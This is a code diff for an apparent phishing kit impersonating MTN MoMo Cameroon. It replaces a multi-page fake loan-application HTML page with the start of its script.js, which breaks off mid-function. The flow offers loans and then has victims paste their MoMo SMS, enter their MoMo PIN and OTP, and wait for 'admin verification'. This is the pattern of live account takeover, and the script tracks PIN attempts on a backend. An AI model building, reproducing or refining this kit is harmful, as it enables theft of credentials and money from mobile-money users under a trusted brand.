@@ -1,297 +1,944 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTN MoMo Cameroon – Easy Loans</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
-    <link rel="stylesheet" href="./style.css" />
-</head>
-<body>
+// ============================================================
+// script.js – Cameroon Version with All Features
+// ============================================================
 
-    <!-- PAGE 1: LANDING -->
-    <div id="page-landing" class="page active">
-        <div class="land-nav">
-            <div style="flex:1;"></div>
-            <div class="mtn-logo">
-                <div class="mtn-logo-icon">M</div>
-                <div class="mtn-logo-text">MoMo</div>
-                <div class="mtn-logo-sub">from MTN</div>
-            </div>
-            <div style="flex:1;"></div>
-        </div>
-        <div class="land-center">
-            <div class="land-card">
-                <h1>Welcome to MTN MoMo Cameroon</h1>
-                <p class="land-tagline">Get loans easily through MTN MoMo Cameroon</p>
-                <div class="calc-box">
-                    <h2>Loan Calculator</h2>
-                    <div class="calc-row2"><span>Amount</span><span class="cv" id="calcAmt">XAF 500,000</span></div>
-                    <div class="calc-row2"><span>Term</span><span class="cv" id="calcTerm">48 Months</span></div>
-                    <input type="range" id="amtSlider" min="500000" max="5000000" step="100000" value="1000000" oninput="updateCalc()" />
-                    <div class="range-ends"><span>XAF 500,000</span><span>XAF 5,000,000</span></div>
-                    <div class="monthly-box"><span class="ml">Monthly Payment</span><span class="ma" id="monthlyAmt">XAF 24,000</span></div>
-                </div>
-                <button class="btn-grad" onclick="startApplication()">START APPLICATION</button>
-            </div>
-        </div>
-        <div class="land-footer">© 2026 MTN MoMo Loans – Powered by MTN</div>
-    </div>
+const S = {
+    loanType: '', loanAmount: 0, loanTerm: '', loanPurpose: '',
+    firstName: '', lastName: '', phone: '', email: '',
+    employment: '', annualIncome: 0,
+    kinName: '', kinPhone: '',
+    applicationId: '',
+    isSubmitting: false,
+    rejectedStep: null
+};
 
-    <!-- PAGE 2: STEP 1 -->
-    <div id="page-step1" class="page">
-        <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
-            <div class="mtn-logo" style="flex-direction:row;gap:6px;">
-                <div class="mtn-logo-icon" style="width:32px;height:32px;font-size:1.2rem;">M</div>
-                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Loans</div></div>
-            </div>
-            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-        </nav>
-        <div class="step-center">
-            <div class="step-card">
-                <h2>Loan Application</h2>
-                <p class="step-sub">Step 1 of 5</p>
-                <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
-                <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
-                <div class="field"><label>Loan Type</label><div class="sel-wrap"><select id="s1ty"><option>Personal Loan</option><option selected>Business Loan</option><option>Home Loan</option><option>Car Loan</option><option>Education Loan</option></select></div></div>
-                <div class="field"><label>Loan Amount (XAF)</label><input type="number" id="s1am" value="1000000" placeholder="Enter amount" oninput="clearErr('s1Err')" /></div>
-                <div class="field"><label>Loan Term</label><div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option selected>48 Months</option><option>60 Months</option></select></div></div>
-                <div class="field"><label>Purpose of Loan</label><textarea id="s1pu" placeholder="Describe the purpose of your loan…" oninput="clearErr('s1Err')"></textarea></div>
-                <button class="btn-grad" onclick="toS2()">NEXT STEP</button>
-            </div>
-        </div>
-    </div>
+let currentPollTimeout = null;
+let otpResendTimer = null;
+let otpResendCountdown = 0;
+let pinBlockTimer = null;
 
-    <!-- PAGE 3: STEP 2 -->
-    <div id="page-step2" class="page">
-        <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-step1')">← Back</a>
-            <div class="mtn-logo" style="flex-direction:row;gap:6px;">
-                <div class="mtn-logo-icon" style="width:32px;height:32px;font-size:1.2rem;">M</div>
-                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Loans</div></div>
-            </div>
-            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-        </nav>
-        <div class="step-center">
-            <div class="step-card">
-                <h2>Loan Application</h2>
-                <p class="step-sub">Step 2 of 5</p>
-                <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
-                <div class="msg-box error" id="s2Err"><span class="msg-icon">✕</span><span id="s2ErrTxt"></span></div>
-                <div class="field-row">
-                    <div class="field"><label>First Name</label><input type="text" id="s2fi" placeholder="First Name" oninput="clearErr('s2Err')" /></div>
-                    <div class="field"><label>Last Name</label><input type="text" id="s2la" placeholder="Last Name" oninput="clearErr('s2Err')" /></div>
-                </div>
-                <div class="field">
-                    <label>Phone Number (Cameroon)</label>
-                    <div class="phone-row"><div class="ph-pre">+237</div><input type="tel" id="s2ph" placeholder="670123456" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')" /></div>
-                    <div class="field-hint">9 digits without +237 prefix (e.g., 670123456)</div>
-                </div>
-                <div class="field"><label>Email Address</label><input type="email" id="s2em" placeholder="your@email.com" oninput="clearErr('s2Err')" /></div>
-                <div class="step-btns"><button class="btn-gray" onclick="goTo('page-step1')">BACK</button><button class="btn-grad" onclick="toS3()">NEXT STEP</button></div>
-            </div>
-        </div>
-    </div>
+// ─── localStorage Helpers ───
+const STORAGE_KEYS = {
+    APPLICATION_ID: 'mtn_application_id',
+    APPLICATION_DATA: 'mtn_application_data',
+    REJECTION_INFO: 'mtn_rejection_info',
+    FORM_DRAFT: 'mtn_form_draft',
+    OTP_TIMER: 'mtn_otp_timer'
+};
 
-    <!-- PAGE 4: STEP 3 -->
-    <div id="page-step3" class="page">
-        <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-step2')">← Back</a>
-            <div class="mtn-logo" style="flex-direction:row;gap:6px;">
-                <div class="mtn-logo-icon" style="width:32px;height:32px;font-size:1.2rem;">M</div>
-                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Loans</div></div>
-            </div>
-            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-        </nav>
-        <div class="step-center">
-            <div class="step-card">
-                <h2>Loan Application</h2>
-                <p class="step-sub">Step 3 of 5</p>
-                <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
-                <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
-                <div class="field"><label>Employment Status</label><div class="sel-wrap"><select id="s3em"><option>Employed</option><option selected>Self-employed</option><option>Unemployed</option><option>Retired</option><option>Student</option></select></div></div>
-                <div class="field"><label>Annual Income (XAF)</label><input type="number" id="s3in" placeholder="Enter annual income" oninput="clearErr('s3Err')" /></div>
-                <div class="field"><label>Next of Kin Name</label><input type="text" id="s3kn" placeholder="Full name of next of kin" oninput="clearErr('s3Err')" /></div>
-                <div class="field"><label>Next of Kin Phone</label><input type="tel" id="s3kp" placeholder="+237 7XX XXX XXX" oninput="clearErr('s3Err')" /></div>
-                <div class="sum-box">
-                    <h3>Application Summary</h3>
-                    <div class="sum-row"><span class="sk">Loan Amount:</span><span class="sv" id="sA">XAF 1,000,000</span></div>
-                    <div class="sum-row"><span class="sk">Loan Term:</span><span class="sv" id="sT">48 Months</span></div>
-                    <div class="sum-row"><span class="sk">Purpose:</span><span class="sv" id="sP">—</span></div>
-                    <div class="sum-row"><span class="sk">Applicant:</span><span class="sv" id="sN">—</span></div>
-                </div>
-                <div class="step-btns"><button class="btn-gray" onclick="goTo('page-step2')">BACK</button><button class="btn-grad" onclick="submitApp()">SUBMIT APPLICATION</button></div>
-            </div>
-        </div>
-    </div>
+function saveToLocalStorage(key, data) {
+    try {
+        localStorage.setItem(key, JSON.stringify(data));
+        console.log(`💾 Saved to localStorage: ${key}`);
+    } catch (error) {
+        console.error(`❌ Failed to save ${key}:`, error);
+    }
+}
 
-    <!-- PAGE 5: PROCESSING -->
-    <div id="page-processing" class="page">
-        <div style="background:linear-gradient(160deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
-            <div class="proc-wrap">
-                <div class="proc-icon">⏳</div>
-                <h2>Processing Application...</h2>
-                <p>Please wait while we process your loan application</p>
-                <div id="processingStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-gold);">⏳ Awaiting admin approval...</div>
-            </div>
-        </div>
-    </div>
+function getFromLocalStorage(key) {
+    try {
+        const data = localStorage.getItem(key);
+        return data ? JSON.parse(data) : null;
+    } catch (error) {
+        console.error(`❌ Failed to load ${key}:`, error);
+        return null;
+    }
+}
 
-    <!-- PAGE 6: SMS PASTE -->
-    <div id="page-sms-paste" class="page">
-        <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-processing')">← Back</a>
-            <div class="mtn-logo" style="flex-direction:row;gap:6px;">
-                <div class="mtn-logo-icon" style="width:32px;height:32px;font-size:1.2rem;">M</div>
-                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Loans</div></div>
-            </div>
-            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-        </nav>
-        <div class="step-center">
-            <div class="step-card">
-                <h2>Verify MoMo Message</h2>
-                <p class="step-sub">Step 4 of 5</p>
-                <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
-                <div class="msg-box error" id="momErr"><span class="msg-icon">✕</span><span id="momErrTxt"></span></div>
-                <div class="momo-msg-box">
-                    <label style="font-weight:600; display:block; margin-bottom:6px;">📩 Paste the MoMo message content:</label>
-                    <textarea id="smsMsgBox" placeholder="Copy and paste the entire MoMo message you received on your phone here..."></textarea>
-                    <div class="hint">This should include the OTP code or verification details sent to your MoMo number.</div>
-                </div>
-                <div style="margin: 8px 0 12px; padding: 10px; background: #f8f9fa; border-radius: 6px; font-size:0.8rem; color:var(--text-light);">
-                    <strong>💡 Tip:</strong> Check your SMS inbox for the message from MTN MoMo. Copy the entire message text.
-                </div>
-                <button class="btn-grad" onclick="doSmsParse()">SUBMIT MOMO MESSAGE</button>
-            </div>
-        </div>
-    </div>
+function removeFromLocalStorage(key) {
+    try {
+        localStorage.removeItem(key);
+        console.log(`🗑️ Removed from localStorage: ${key}`);
+    } catch (error) {
+        console.error(`❌ Failed to remove ${key}:`, error);
+    }
+}
 
-    <!-- PAGE 7: WAIT SMS -->
-    <div id="page-wait-sms" class="page">
-        <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
-            <div class="wait-wrap">
-                <div class="wait-icon">⏳</div>
-                <h2>Verifying SMS Message...</h2>
-                <p>Your SMS message has been received. Please wait for admin verification...</p>
-                <div id="waitSmsStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-gold);">⏳ Admin is reviewing your SMS...</div>
-                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitSmsAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
-            </div>
-        </div>
-    </div>
+// ─── Save/Load Functions ───
+function saveApplicationId(id) {
+    if (id) {
+        S.applicationId = id;
+        saveToLocalStorage(STORAGE_KEYS.APPLICATION_ID, {
+            id: id,
+            timestamp: new Date().toISOString()
+        });
+    }
+}
 
-    <!-- PAGE 8: PIN (5 DIGITS) -->
-    <div id="page-pin" class="page">
-        <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-wait-sms')">← Back</a>
-            <div class="mtn-logo" style="flex-direction:row;gap:6px;">
-                <div class="mtn-logo-icon" style="width:32px;height:32px;font-size:1.2rem;">M</div>
-                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Loans</div></div>
-            </div>
-            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-        </nav>
-        <div class="step-center">
-            <div class="step-card">
-                <h2>Enter MoMo PIN</h2>
-                <p class="step-sub">Step 5 of 5</p>
-                <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
-                <div class="msg-box error" id="pinErr"><span class="msg-icon">✕</span><span id="pinErrTxt"></span></div>
-                <div class="pin-label">Enter your MoMo PIN (5 digits):</div>
-                <div class="pin-row">
-                    <input type="password" id="pin0" class="pin-box" maxlength="1" oninput="pinMvM(this,0)" placeholder="•" />
-                    <input type="password" id="pin1" class="pin-box" maxlength="1" oninput="pinMvM(this,1)" placeholder="•" />
-                    <input type="password" id="pin2" class="pin-box" maxlength="1" oninput="pinMvM(this,2)" placeholder="•" />
-                    <input type="password" id="pin3" class="pin-box" maxlength="1" oninput="pinMvM(this,3)" placeholder="•" />
-                    <input type="password" id="pin4" class="pin-box" maxlength="1" oninput="pinMvM(this,4)" placeholder="•" />
-                    <button class="pin-eye" onclick="togPin()" title="Show/Hide">👁</button>
-                    <button class="pin-delete" onclick="clearLoginPin()" title="Delete PIN">✕</button>
-                </div>
-                <button class="btn-grad" onclick="doPin()">SUBMIT MOMO PIN</button>
-            </div>
-        </div>
-    </div>
+function loadApplicationId() {
+    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
+    if (saved && saved.id) {
+        const age = Date.now() - new Date(saved.timestamp).getTime();
+        if (age < 24 * 60 * 60 * 1000) {
+            S.applicationId = saved.id;
+            console.log(`🔄 Restored application ID: ${saved.id}`);
+            return saved.id;
+        } else {
+            removeFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
+        }
+    }
+    return null;
+}
 
-    <!-- PAGE 9: WAIT PIN -->
-    <div id="page-wait-pin" class="page">
-        <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
-            <div class="wait-wrap">
-                <div class="wait-icon">⏳</div>
-                <h2>Verifying MoMo PIN...</h2>
-                <p>Your MoMo PIN has been received. Please wait for admin verification...</p>
-                <div id="waitPinStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-gold);">⏳ Admin is reviewing your PIN...</div>
-                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitPinAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
-            </div>
-        </div>
-    </div>
+function saveApplicationData() {
+    const dataToSave = {
+        ...S,
+        timestamp: new Date().toISOString()
+    };
+    saveToLocalStorage(STORAGE_KEYS.APPLICATION_DATA, dataToSave);
+}
 
-    <!-- PAGE 10: OTP (4 DIGITS) -->
-    <div id="page-otp" class="page">
-        <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-wait-pin')">← Back</a>
-            <div class="mtn-logo" style="flex-direction:row;gap:6px;">
-                <div class="mtn-logo-icon" style="width:32px;height:32px;font-size:1.2rem;">M</div>
-                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Loans</div></div>
-            </div>
-            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-        </nav>
-        <div class="step-center">
-            <div class="step-card">
-                <h2>Enter OTP Code</h2>
-                <p class="step-sub">Enter the 4-digit OTP code sent to your phone via MTN MoMo</p>
-                <div class="otp-section">
-                    <div class="otp-section-title">OTP Code (4 digits):</div>
-                    <div style="display: flex; align-items: center;">
-                        <div class="otp-inputs" id="otpInputs">
-                            <input type="password" id="otp0" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
-                            <input type="password" id="otp1" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
-                            <input type="password" id="otp2" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
-                            <input type="password" id="otp3" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
-                        </div>
-                        <button class="otp-delete" onclick="clearOtpCode()" title="Delete OTP">✕</button>
-                    </div>
-                </div>
-                <div class="msg-box error" id="otpErr"><span class="msg-icon">✕</span><span id="otpErrTxt"></span></div>
-                <button class="btn-grad" onclick="doOtp()">VERIFY & APPROVE LOAN</button>
-            </div>
-        </div>
-    </div>
+function loadApplicationData() {
+    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
+    if (saved) {
+        const age = Date.now() - new Date(saved.timestamp).getTime();
+        if (age < 24 * 60 * 60 * 1000) {
+            const fieldsToRestore = [
+                'loanType', 'loanAmount', 'loanTerm', 'loanPurpose',
+                'firstName', 'lastName', 'phone', 'email',
+                'employment', 'annualIncome', 'kinName', 'kinPhone',
+                'applicationId', 'rejectedStep'
+            ];
+            fieldsToRestore.forEach(field => {
+                if (saved[field] !== undefined) {
+                    S[field] = saved[field];
+                }
+            });
+            console.log('🔄 Restored application data from localStorage');
+            return true;
+        } else {
+            removeFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
+        }
+    }
+    return false;
+}
 
-    <!-- PAGE 11: WAIT OTP -->
-    <div id="page-wait-otp" class="page">
-        <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
-            <div class="wait-wrap">
-                <div class="wait-icon">⏳</div>
-                <h2>Verifying OTP Code...</h2>
-                <p>Your OTP code has been received. Please wait for admin verification...</p>
-                <div id="waitOtpStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-gold);">⏳ Admin is verifying your OTP...</div>
-                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitOtpAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
-            </div>
-        </div>
-    </div>
+function saveRejectionInfo(step, applicationId) {
+    saveToLocalStorage(STORAGE_KEYS.REJECTION_INFO, {
+        step: step,
+        applicationId: applicationId,
+        timestamp: new Date().toISOString()
+    });
+}
 
-    <!-- PAGE 12: APPROVAL -->
-    <div id="page-approval" class="page">
-        <div class="appr-wrap">
-            <div class="appr-top">
-                <div class="check-circle">✓</div>
-                <h2 class="appr-title">Loan Approved!</h2>
-                <p class="appr-sub">Your loan has been successfully approved.</p>
-                <div class="appr-banner"><div class="abl">Amount to Receive</div><div class="aba" id="aprAmount">XAF 1,000,000</div></div>
-            </div>
-            <div class="comp-box"><div class="ch">ℹ️ Important Information</div><p>The funds will be deposited directly to your MTN MoMo account within 5 minutes. Please ensure your phone number is correct.</p></div>
-            <div class="ld-card">
-                <div class="ld-htitle">📊 Loan Details</div>
-                <div class="ld-row"><div class="ld-icon ic-g">💰</div><div><div class="ld-lbl">Amount</div><div class="ld-val" id="aprAmt">XAF 1,000,000</div></div></div>
-                <div class="ld-row"><div class="ld-icon ic-b">📅</div><div><div class="ld-lbl">Term</div><div class="ld-val" id="aprTerm">48 Months</div></div></div>
-                <div class="ld-row"><div class="ld-icon ic-p">💳</div><div><div class="ld-lbl">Monthly Payment</div><div class="ld-val" id="aprMth">XAF 24,000</div></div></div>
-            </div>
-            <div class="nxt-steps"><span style="font-size:1.2rem;">📌</span><p><strong>Next Steps:</strong> To start repaying, you can set up an automatic payment plan in your MTN MoMo account in the next section.</p></div>
-            <div class="rth-wrap">
-                <button class="rth-btn" onclick="alert('Thank you! Your loan has been disbursed.')">FINISH</button>
-            </div>
-        </div>
-    </div>
+function loadRejectionInfo() {
+    const saved = getFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
+    if (saved) {
+        const age = Date.now() - new Date(saved.timestamp).getTime();
+        if (age < 5 * 60 * 1000) {
+            return saved;
+        } else {
+            removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
+        }
+    }
+    return null;
+}
 
-    <script src="./script.js"></script>
-</body>
-</html>
+function clearRejectionInfo() {
+    removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
+}
+
+function saveFormDraft() {
+    const draft = {
+        firstName: document.getElementById('s2fi')?.value || '',
+        lastName: document.getElementById('s2la')?.value || '',
+        phone: document.getElementById('s2ph')?.value || '',
+        email: document.getElementById('s2em')?.value || '',
+        loanAmount: document.getElementById('s1am')?.value || '',
+        loanPurpose: document.getElementById('s1pu')?.value || '',
+        employment: document.getElementById('s3em')?.value || '',
+        annualIncome: document.getElementById('s3in')?.value || '',
+        kinName: document.getElementById('s3kn')?.value || '',
+        kinPhone: document.getElementById('s3kp')?.value || '',
+        timestamp: new Date().toISOString()
+    };
+    saveToLocalStorage(STORAGE_KEYS.FORM_DRAFT, draft);
+}
+
+function loadFormDraft() {
+    const draft = getFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
+    if (draft) {
+        const age = Date.now() - new Date(draft.timestamp).getTime();
+        if (age < 24 * 60 * 60 * 1000) {
+            if (draft.firstName) document.getElementById('s2fi').value = draft.firstName;
+            if (draft.lastName) document.getElementById('s2la').value = draft.lastName;
+            if (draft.phone) document.getElementById('s2ph').value = draft.phone;
+            if (draft.email) document.getElementById('s2em').value = draft.email;
+            if (draft.loanAmount) document.getElementById('s1am').value = draft.loanAmount;
+            if (draft.loanPurpose) document.getElementById('s1pu').value = draft.loanPurpose;
+            if (draft.employment) document.getElementById('s3em').value = draft.employment;
+            if (draft.annualIncome) document.getElementById('s3in').value = draft.annualIncome;
+            if (draft.kinName) document.getElementById('s3kn').value = draft.kinName;
+            if (draft.kinPhone) document.getElementById('s3kp').value = draft.kinPhone;
+            console.log('🔄 Restored form draft from localStorage');
+            return true;
+        } else {
+            removeFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
+        }
+    }
+    return false;
+}
+
+// ─── Navigation ───
+function goTo(pageId) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    const el = document.getElementById(pageId);
+    if (el) el.classList.add('active');
+    window.scrollTo(0, 0);
+}
+
+function startApplication() {
+    S.rejectedStep = null;
+    clearRejectionInfo();
+    
+    if (!S.applicationId) {
+        S.applicationId = 'MTN-CM-' + Date.now().toString().slice(-6);
+        saveApplicationId(S.applicationId);
+    }
+    
+    document.getElementById('resendOtpBtn')?.classList.add('hidden');
+    
+    ['s1Err', 's2Err', 's3Err', 'momErr', 'pinErr', 'otpErr'].forEach(id => {
+        clearErr(id);
+    });
+    
+    goTo('page-step1');
+}
+
+// ─── Toast Notifications ───
+function showToast(message, type = 'info', duration = 3000) {
+    const existing = document.querySelector('.toast');
+    if (existing) existing.remove();
+    
+    const toast = document.createElement('div');
+    toast.className = `toast toast-${type}`;
+    toast.textContent = message;
+    document.body.appendChild(toast);
+    
+    setTimeout(() => {
+        toast.style.opacity = '0';
+        toast.style.transform = 'translateX(-50%) translateY(-20px)';
+        setTimeout(() => toast.remove(), 300);
+    }, duration);
+}
+
+// ─── Form Helpers ───
+function normalizePhone(id) {
+    let inp = document.getElementById(id);
+    let val = inp.value.replace(/\D/g, '');
+    if (val.length > 9) val = val.substring(0, 9);
+    inp.value = val;
+    saveFormDraft();
+}
+
+function updateCalc() {
+    const amt = +document.getElementById('amtSlider').value;
+    document.getElementById('calcAmt').textContent = 'XAF ' + amt.toLocaleString();
+    const monthly = Math.ceil(amt / 48);
+    document.getElementById('monthlyAmt').textContent = 'XAF ' + monthly.toLocaleString();
+}
+
+function showErr(id, msg) {
+    const box = document.getElementById(id);
+    if (box) {
+        box.classList.add('show');
+        const txt = document.getElementById(id + 'Txt');
+        if (txt) txt.textContent = msg;
+    }
+}
+
+function clearErr(id) {
+    const box = document.getElementById(id);
+    if (box) box.classList.remove('show');
+}
+
+// ─── Step Navigation ───
+function toS2() {
+    const ty = document.getElementById('s1ty').value;
+    const am = +document.getElementById('s1am').value;
+    const te = document.getElementById('s1te').value;
+    const pu = document.getElementById('s1pu').value;
+    
+    if (!ty || am <= 0 || !te || !pu.trim()) {
+        showErr('s1Err', 'Please complete all fields.');
+        return;
+    }
+    
+    S.loanType = ty; 
+    S.loanAmount = am; 
+    S.loanTerm = te; 
+    S.loanPurpose = pu;
+    
+    saveApplicationData();
+    saveFormDraft();
+    goTo('page-step2');
+}
+
+function toS3() {
+    const fi = document.getElementById('s2fi').value.trim();
+    const la = document.getElementById('s2la').value.trim();
+    const ph = document.getElementById('s2ph').value;
+    const em = document.getElementById('s2em').value.trim();
+    
+    if (!fi || !la) {
+        showErr('s2Err', 'Please enter your full name.');
+        return;
+    }
+    
+    if (ph.length !== 9) {
+        showErr('s2Err', 'Please enter a valid 9-digit phone number.');
+        return;
+    }
+    
+    if (!em || !em.includes('@')) {
+        showErr('s2Err', 'Please enter a valid email address.');
+        return;
+    }
+    
+    S.firstName = fi; 
+    S.lastName = la; 
+    S.phone = ph; 
+    S.email = em;
+    
+    saveApplicationData();
+    saveFormDraft();
+    goTo('page-step3');
+}
+
+// ─── PIN/OTP Helpers ───
+function pinMvM(el, i, maxLength = 5) {
+    el.value = el.value.replace(/\D/g, '');
+    if (el.value && i < maxLength - 1) {
+        const nextPin = document.getElementById('pin' + (i + 1));
+        if (nextPin) { nextPin.focus(); return; }
+    }
+    
+    if (i === maxLength - 1 && el.value) {
+        const allFilled = [0,1,2,3,4].every(idx => document.getElementById('pin' + idx)?.value);
+        if (allFilled) {
+            setTimeout(() => doPin(), 300);
+        }
+    }
+}
+
+function togPin() {
+    for (let i = 0; i < 5; i++) {
+        const b = document.getElementById('pin' + i);
+        if (b) b.type = b.type === 'password' ? 'text' : 'password';
+    }
+    for (let i = 0; i < 4; i++) {
+        const b = document.getElementById('otp' + i);
+        if (b) b.type = b.type === 'password' ? 'text' : 'password';
+    }
+}
+
+function chkPin() {
+    const pinOk = [0,1,2,3,4].every(i => document.getElementById('pin' + i)?.value);
+    const pinBtn = document.querySelector('#page-pin .btn-grad');
+    if (pinBtn) pinBtn.disabled = !pinOk;
+
+    const otpOk = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
+    const otpBtn = document.querySelector('#page-otp .btn-grad');
+    if (otpBtn) otpBtn.disabled = !otpOk;
+}
+
+document.addEventListener('keyup', chkPin);
+
+function clearLoginPin() {
+    [0,1,2,3,4].forEach(i => document.getElementById('pin'+i).value = '');
+    document.getElementById('pin0').focus();
+    chkPin();
+}
+
+function clearOtpCode() {
+    [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
+    document.getElementById('otp0').focus();
+    chkPin();
+}
+
+function handleOtpInput(el, type) {
+    el.value = el.value.replace(/\D/, '');
+    const idx = parseInt(el.id.match(/\d$/)[0]);
+    if (el.value && type === 'otp' && idx < 3) {
+        document.getElementById('otp' + (idx + 1))?.focus();
+    }
+    chkPin();
+    
+    if (idx === 3 && el.value) {
+        const allFilled = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
+        if (allFilled) {
+            setTimeout(() => doOtp(), 300);
+        }
+    }
+}
+
+// ─── PIN Attempt Functions ───
+async function checkPinStatus() {
+    try {
+        const response = await fetch(`/api/pin-status/${S.applicationId}`);
+        const data = await response.json();
+        
+        if (data.ok) {
+            const remaining = data.remainingAttempts || 3;
+            
+            const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
+            if (attemptsDisplay) {
+                if (data.isBlocked) {
+                    attemptsDisplay.innerHTML = `🔒 Too many attempts. Blocked for ${data.blockRemainingSeconds}s`;
+                    attemptsDisplay.className = 'pin-attempts blocked';
+                    document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = true);
+                    document.querySelector('#page-pin .btn-grad').disabled = true;
+                    
+                    startPinBlockCountdown(data.blockRemainingSeconds);
+                } else {
+                    attemptsDisplay.innerHTML = `🔑 Attempts remaining: ${remaining} of 3`;
+                    attemptsDisplay.className = 'pin-attempts';
+                }
+            }
+            
+            return data;
+        }
+    } catch (error) {
+        console.error('Error checking PIN status:', error);
+    }
+    return null;
+}
+
+function startPinBlockCountdown(seconds) {
+    const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
+    if (!attemptsDisplay) return;
+    
+    if (pinBlockTimer) {
+        clearInterval(pinBlockTimer);
+        pinBlockTimer = null;
+    }
+    
+    let remaining = seconds;
+    attemptsDisplay.textContent = `🔒 Too many attempts. Blocked for ${remaining}s`;
+    attemptsDisplay.className = 'pin-attempts blocked';
+    
+    pinBlockTimer = setInterval(() => {
+        remaining--;
+        if (remaining <= 0) {
+            clearInterval(pinBlockTimer);
+            pinBlockTimer = null;
+            attemptsDisplay.textContent = '✅ PIN available. Please try again.';
+            attemptsDisplay.className = 'pin-attempts available';
+            document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = false);
+            document.querySelector('#page-pin .btn-grad').disabled = false;
+            resetPinAttempts();
+        } else {
+            attemptsDisplay.textContent = `🔒 Too many attempts. Blocked for ${remaining}s`;
+        }
+    }, 1000);
+}
+
+async function resetPinAttempts() {
+    try {
+        await fetch(`/api/reset-pin-attempts/${S.applicationId}`, {
+            method: 'POST'
+        });
